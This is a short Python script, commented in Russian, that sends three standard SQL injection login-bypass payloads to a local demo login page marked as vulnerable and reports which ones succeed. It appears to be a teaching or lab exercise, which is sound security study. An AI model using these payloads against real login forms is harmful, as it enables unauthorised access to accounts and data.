# simple_sqlmap.py
import requests

# Тестовые payloads для демонстрации
payloads = [
    "' OR '1'='1' --",
    "' UNION SELECT 1,2,3 --", 
    "admin' --"
]

print("=== ПРОСТОЙ SQLMap ТЕСТ ===")
for payload in payloads:
    data = {
        'username': payload,
        'password': 'test',
        'submit': 'Войти'
    }
    
    try:
        response = requests.post('http://127.0.0.1:5000/login-vulnerable', data=data)
        if 'Успешный вход' in response.text:
            print(f"✅ УСПЕХ с payload: {payload}")
        else:
            print(f"❌ НЕ УСПЕХ с payload: {payload}")
    except Exception as e:
        print(f"🚫 ОШИБКА: {e}")